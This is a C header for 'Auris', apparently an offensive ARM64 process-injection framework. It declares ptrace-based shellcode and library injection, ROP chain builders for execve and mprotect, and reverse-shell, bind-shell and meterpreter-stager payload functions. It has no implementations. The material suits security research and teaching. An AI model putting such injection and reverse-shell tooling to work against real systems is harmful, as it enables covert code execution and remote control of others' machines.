/*
 * Auris - Process Injection Framework
 * ARM64 ptrace-based process injection for offensive security research
 * 
 * WARNING: This code is for authorized security research and penetration
 * testing only. Unauthorized use against systems you do not own or have
 * explicit permission to test is illegal.
 */

#ifndef AURIS_INJECT_H
#define AURIS_INJECT_H

#include "auris.h"
#include <sys/types.h>

/* Injection method types */
typedef enum {
    INJECT_METHOD_PTRACE_SHELLCODE = 0,  /* Classic ptrace shellcode injection */
    INJECT_METHOD_PTRACE_DLOPEN,          /* Inject via dlopen() call */
    INJECT_METHOD_PTRACE_MMAP,            /* Allocate memory via mmap injection */
    INJECT_METHOD_PROC_MEM,               /* Write via /proc/pid/mem */
} sg_inject_method_t;

/* Injection target information */
typedef struct {
    pid_t pid;                            /* Target process ID */
    char comm[16];                        /* Process name */
    char exe_path[MAX_PATH_LEN];          /* Path to executable */
    uid_t uid;                            /* Process UID */
    gid_t gid;                            /* Process GID */
    bool is_attached;                     /* Currently attached via ptrace */
    bool was_stopped;                     /* Was stopped before we attached */
} sg_inject_target_t;

/* Memory region from /proc/pid/maps */
typedef struct {
    uint64_t start;                       /* Region start address */
    uint64_t end;                         /* Region end address */
    bool readable;
    bool writable;
    bool executable;
    bool is_private;                      /* Private or shared mapping */
    uint64_t offset;                      /* File offset */
    char pathname[MAX_PATH_LEN];          /* Mapped file path (if any) */
} sg_memory_region_t;

/* Memory map of target process */
typedef struct {
    sg_memory_region_t *regions;
    size_t region_count;
    size_t region_capacity;
    
    /* Quick access to important regions */
    sg_memory_region_t *text_region;      /* Main executable .text */
    sg_memory_region_t *stack_region;     /* Stack */
    sg_memory_region_t *heap_region;      /* Heap */
    sg_memory_region_t *libc_region;      /* libc .text */
    sg_memory_region_t *vdso_region;      /* vDSO */
} sg_memory_map_t;

/* ARM64 register state for injection */
typedef struct {
    uint64_t regs[31];                    /* x0-x30 */
    uint64_t sp;                          /* Stack pointer */
    uint64_t pc;                          /* Program counter */
    uint64_t pstate;                      /* Process state */
} sg_arm64_regs_t;

/* Shellcode payload */
typedef struct {
    uint8_t *code;                        /* Shellcode bytes */
    size_t length;                        /* Length in bytes */
    char name[64];                        /* Payload name */
    char description[256];                /* What it does */
    bool needs_fixup;                     /* Requires address fixup */
    size_t fixup_offset;                  /* Offset to patch */
} sg_shellcode_t;

/* Injection context */
typedef struct {
    sg_inject_target_t target;
    sg_memory_map_t *memory_map;
    sg_arm64_regs_t saved_regs;           /* Original registers */
    uint8_t *saved_code;                  /* Original code at injection point */
    size_t saved_code_len;
    uint64_t injection_addr;              /* Where we injected */
    sg_inject_method_t method;
    bool injection_active;
    bool restore_on_cleanup;
} sg_inject_ctx_t;

/* Injection result */
typedef struct {
    bool success;
    sg_error_t error;
    char error_msg[256];
    uint64_t injected_addr;               /* Where shellcode was placed */
    uint64_t return_value;                /* Return value after execution */
    uint64_t execution_time_ns;           /* How long execution took */
} sg_inject_result_t;

/* ROP gadget */
typedef struct {
    uint64_t address;                     /* Gadget address */
    uint8_t bytes[32];                    /* Gadget bytes */
    size_t length;                        /* Gadget length */
    char disasm[64];                      /* Disassembly */
    uint32_t type;                        /* Gadget type flags */
} sg_rop_gadget_t;

/* ROP gadget types */
#define GADGET_TYPE_RET         (1 << 0)  /* Ends with RET */
#define GADGET_TYPE_LOAD_X0     (1 << 1)  /* Loads x0 from stack/memory */
#define GADGET_TYPE_LOAD_X1     (1 << 2)  /* Loads x1 */
#define GADGET_TYPE_LOAD_X2     (1 << 3)  /* Loads x2 */
#define GADGET_TYPE_LOAD_X8     (1 << 4)  /* Loads x8 (syscall nr) */
#define GADGET_TYPE_SYSCALL     (1 << 5)  /* Contains SVC instruction */
#define GADGET_TYPE_CALL        (1 << 6)  /* BLR instruction */
#define GADGET_TYPE_STACK_PIVOT (1 << 7)  /* Modifies SP */

/* ROP chain */
typedef struct {
    uint64_t *chain;                      /* Array of addresses/values */
    size_t length;                        /* Number of entries */
    size_t capacity;
    char description[256];
} sg_rop_chain_t;

/* Gadget database for a binary */
typedef struct {
    sg_rop_gadget_t *gadgets;
    size_t gadget_count;
    size_t gadget_capacity;
    char binary_path[MAX_PATH_LEN];
    uint64_t base_address;                /* Load address */
} sg_gadget_db_t;

/*
 * Target discovery and enumeration
 */

/* Find injectable processes (returns array of PIDs) */
sg_error_t sg_inject_find_targets(pid_t **pids_out, size_t *count_out);

/* Get detailed info about a target process */
sg_error_t sg_inject_get_target_info(pid_t pid, sg_inject_target_t *target_out);

/* Check if we can inject into a process */
sg_error_t sg_inject_check_permissions(pid_t pid, bool *can_inject);

/*
 * Memory mapping and analysis
 */

/* Parse /proc/pid/maps into memory map structure */
sg_error_t sg_inject_parse_maps(pid_t pid, sg_memory_map_t **map_out);

/* Free memory map */
void sg_inject_free_maps(sg_memory_map_t *map);

/* Find a suitable injection point (executable, writable region) */
sg_error_t sg_inject_find_cave(sg_memory_map_t *map, size_t min_size, 
                                uint64_t *addr_out);

/* Find region containing address */
sg_memory_region_t *sg_inject_find_region(sg_memory_map_t *map, uint64_t addr);

/*
 * Core injection operations
 */

/* Initialize injection context */
sg_error_t sg_inject_init(sg_inject_ctx_t *ctx, pid_t target_pid);

/* Clean up injection context (restores original state if needed) */
void sg_inject_cleanup(sg_inject_ctx_t *ctx);

/* Attach to target process */
sg_error_t sg_inject_attach(sg_inject_ctx_t *ctx);

/* Detach from target process */
sg_error_t sg_inject_detach(sg_inject_ctx_t *ctx);

/* Save current register state */
sg_error_t sg_inject_save_regs(sg_inject_ctx_t *ctx);

/* Restore saved register state */
sg_error_t sg_inject_restore_regs(sg_inject_ctx_t *ctx);

/* Read registers from target */
sg_error_t sg_inject_read_regs(pid_t pid, sg_arm64_regs_t *regs);

/* Write registers to target */
sg_error_t sg_inject_write_regs(pid_t pid, const sg_arm64_regs_t *regs);

/* Read memory from target process */
ssize_t sg_inject_read_mem(pid_t pid, uint64_t addr, void *buf, size_t len);

/* Write memory to target process */
ssize_t sg_inject_write_mem(pid_t pid, uint64_t addr, const void *buf, size_t len);

/* Write memory via /proc/pid/mem (alternative method) */
ssize_t sg_inject_write_mem_proc(pid_t pid, uint64_t addr, const void *buf, size_t len);

/*
 * Shellcode injection
 */

/* Inject and execute shellcode */
sg_error_t sg_inject_shellcode(sg_inject_ctx_t *ctx,
                                const sg_shellcode_t *shellcode,
                                sg_inject_result_t *result);

/* Inject shellcode at specific address */
sg_error_t sg_inject_shellcode_at(sg_inject_ctx_t *ctx,
                                   uint64_t addr,
                                   const sg_shellcode_t *shellcode,
                                   sg_inject_result_t *result);

/* Execute injected code and wait for completion */
sg_error_t sg_inject_execute(sg_inject_ctx_t *ctx, uint64_t addr,
                              sg_inject_result_t *result);

/*
 * Advanced injection techniques
 */

/* Inject via mmap - allocate new executable memory */
sg_error_t sg_inject_via_mmap(sg_inject_ctx_t *ctx,
                               const sg_shellcode_t *shellcode,
                               sg_inject_result_t *result);

/* Inject shared library via dlopen */
sg_error_t sg_inject_library(sg_inject_ctx_t *ctx,
                              const char *library_path,
                              sg_inject_result_t *result);

/* Call arbitrary function in target process */
sg_error_t sg_inject_call_function(sg_inject_ctx_t *ctx,
                                    uint64_t func_addr,
                                    uint64_t args[6],
                                    uint64_t *ret_value);

/*
 * ROP chain building
 */

/* Find ROP gadgets in a binary/library */
sg_error_t sg_rop_find_gadgets(const char *binary_path, 
                                uint64_t base_addr,
                                sg_gadget_db_t **db_out);

/* Free gadget database */
void sg_rop_free_gadgets(sg_gadget_db_t *db);

/* Find gadget by type */
sg_rop_gadget_t *sg_rop_find_gadget_by_type(sg_gadget_db_t *db, uint32_t type);

/* Build ROP chain for execve("/bin/sh", NULL, NULL) */
sg_error_t sg_rop_build_execve_chain(sg_gadget_db_t *db,
                                      const char *command,
                                      sg_rop_chain_t **chain_out);

/* Build ROP chain for mprotect (make memory executable) */
sg_error_t sg_rop_build_mprotect_chain(sg_gadget_db_t *db,
                                        uint64_t addr,
                                        size_t len,
                                        sg_rop_chain_t **chain_out);

/* Free ROP chain */
void sg_rop_free_chain(sg_rop_chain_t *chain);

/* Inject and execute ROP chain */
sg_error_t sg_inject_rop_chain(sg_inject_ctx_t *ctx,
                                sg_rop_chain_t *chain,
                                sg_inject_result_t *result);

/*
 * Pre-built shellcode payloads
 */

/* Get reverse shell shellcode (connects back to attacker) */
sg_error_t sg_shellcode_reverse_shell(const char *ip, uint16_t port,
                                       sg_shellcode_t **shellcode_out);

/* Get bind shell shellcode (listens for connection) */
sg_error_t sg_shellcode_bind_shell(uint16_t port,
                                    sg_shellcode_t **shellcode_out);

/* Get execve("/bin/sh") shellcode */
sg_error_t sg_shellcode_exec_sh(sg_shellcode_t **shellcode_out);

/* Get arbitrary command execution shellcode */
sg_error_t sg_shellcode_exec_cmd(const char *command,
                                  sg_shellcode_t **shellcode_out);

/* Get meterpreter stager shellcode */
sg_error_t sg_shellcode_meterpreter_stager(const char *ip, uint16_t port,
                                            sg_shellcode_t **shellcode_out);

/* Free shellcode */
void sg_shellcode_free(sg_shellcode_t *shellcode);

/*
 * Utility functions
 */

/* Resolve symbol address in target process */
sg_error_t sg_inject_resolve_symbol(sg_inject_ctx_t *ctx,
                                     const char *library,
                                     const char *symbol,
                                     uint64_t *addr_out);

/* Find libc base address in target */
sg_error_t sg_inject_find_libc(sg_inject_ctx_t *ctx, uint64_t *base_out);

/* Find specific function in libc (dlopen, system, etc.) */
sg_error_t sg_inject_find_libc_func(sg_inject_ctx_t *ctx,
                                     const char *func_name,
                                     uint64_t *addr_out);

/* Hexdump memory region */
void sg_inject_hexdump(const void *data, size_t len, uint64_t base_addr);

/* Disassemble ARM64 instructions */
sg_error_t sg_inject_disasm(const uint8_t *code, size_t len, 
                             uint64_t base_addr, char *output, size_t output_len);

#endif /* AURIS_INJECT_H */
